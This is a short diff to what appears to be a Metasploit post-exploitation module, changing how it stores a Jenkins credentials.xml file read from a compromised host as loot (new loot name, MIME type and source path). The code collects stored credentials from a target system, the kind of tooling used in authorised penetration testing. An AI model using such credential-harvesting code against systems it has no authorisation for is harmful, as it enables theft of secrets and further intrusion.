@@ -53,7 +53,7 @@ class MetasploitModule < Msf::Post
     if exists?(file)
       f = read_file(file)
       if datastore['STORE_LOOT']
-        loot_path = store_loot('credentials.xml', 'text/plain', session, f)
+        loot_path = store_loot('jenkins.creds', 'text/xml', session, f, file)
         vprint_status("File credentials.xml saved to #{loot_path}")
       end
     else
